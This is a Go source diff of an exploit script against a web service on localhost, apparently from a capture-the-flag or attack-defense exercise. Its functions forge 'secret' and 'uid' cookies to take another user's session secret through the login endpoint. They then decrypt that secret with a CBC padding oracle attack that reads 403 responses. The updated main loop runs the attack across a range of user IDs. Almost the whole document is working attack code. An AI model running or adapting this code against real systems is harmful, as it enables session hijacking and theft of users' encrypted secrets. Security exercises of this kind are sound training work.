@@ -24,6 +24,11 @@ type User struct {
 	Password string
 }
 
+type LoginUser struct {
+	UserId   uint
+	Password string
+}
+
 func addNewTask(wg *sync.WaitGroup, source, stdin, token string, owner uint) []byte {
 	defer wg.Done()
 	task := Task{
@@ -74,16 +79,24 @@ func addNewUser(wg *sync.WaitGroup, password string) []byte {
 }
 
 func stealCookie(secret string, cookieUserId, desiredCookieId uint) string {
-	req, err := http.NewRequest("GET", fmt.Sprintf("http://localhost:8080/check?userid=%v&password=kekeke", desiredCookieId), nil)
+	loginUser := LoginUser{
+		UserId: desiredCookieId,
+		Password: "randomstring",
+	}
+	data, err := json.Marshal(loginUser)
 	if err != nil {
-		panic(err)
+		panic("can not marshal task: " + err.Error())
+	}
+	req, err := http.NewRequest("POST", "http://localhost:8080/login", bytes.NewReader(data))
+	if err != nil {
+		panic("can not create request: " + err.Error())
 	}
 	req.AddCookie(&http.Cookie{Name: "secret", Value: secret})
 	req.AddCookie(&http.Cookie{Name: "uid", Value: fmt.Sprint(cookieUserId)})
 	client := &http.Client{}
 	resp, err := client.Do(req)
 	if err != nil {
-		panic(err)
+		panic("can not do request: " + err.Error())
 	}
 	for _, cookie := range resp.Cookies() {
 		if cookie.Name == "secret" {
@@ -91,21 +104,21 @@ func stealCookie(secret string, cookieUserId, desiredCookieId uint) string {
 			return cookie.Value
 		}
 	}
-	panic("!")
+	panic(fmt.Sprintf("response has no cookies: %v", resp.Cookies()))
 }
 
 func tryDecr(userId uint, encrypted []byte) bool {
 	secretB64 := base64.StdEncoding.EncodeToString(encrypted)
-	req, err := http.NewRequest("GET", "http://localhost:8080/task_info/4", nil)
+	req, err := http.NewRequest("GET", "http://localhost:8080/task_info/0", nil)
 	if err != nil {
-		panic(err)
+		panic("can not create request: " + err.Error())
 	}
 	req.AddCookie(&http.Cookie{Name: "secret", Value: secretB64})
 	req.AddCookie(&http.Cookie{Name: "uid", Value: fmt.Sprint(userId)})
 	client := &http.Client{}
 	resp, err := client.Do(req)
 	if err != nil {
-		panic(err)
+		panic("can not do request: " + err.Error())
 	}
 	return resp.StatusCode == 403
 }
@@ -148,13 +161,13 @@ func paddingOracleAttackBlock(userId uint, leftBlock, rightBlock []byte) string 
 func paddingOracleAttack(secret string, userId uint) string {
 	fullSecret, err := base64.StdEncoding.DecodeString(secret)
 	if len(fullSecret)%16 != 0 {
-		panic("!")
+		panic(fmt.Sprintf("invalid secret size: %v", len(fullSecret)))
 	}
 	blocksCount := len(fullSecret) / 16
 	fmt.Println("Blocks count: ", blocksCount)
 	fmt.Print("Getting blocks... 1 ")
 	if err != nil {
-		panic(err)
+		panic("Can not decode base64: " + err.Error())
 	}
 	var result strings.Builder
 	result.WriteString(paddingOracleAttackBlock(userId, cbc.InitVector, fullSecret[:16]))
@@ -169,10 +182,16 @@ func paddingOracleAttack(secret string, userId uint) string {
 
 func examplePOA(secret string, cookieUserId, desiredUserId uint) {
 	realSecret := stealCookie(secret, cookieUserId, desiredUserId)
+	fmt.Println(len(realSecret))
+	if len(realSecret) != 64 {
+		return
+	}
 	plainSecret := paddingOracleAttack(realSecret, desiredUserId)
 	fmt.Printf("Plain secret: '%v'\n", plainSecret)
 }
 
 func main() {
-	examplePOA("L7IgQG/tU2Fn0iKVZ9EneA==", 1, 0)
+	for i := 10; i < 70; i++ {
+		examplePOA("X8pieqciaGwScCfFVYUQIA==", 80, uint(i))
+	}
 }
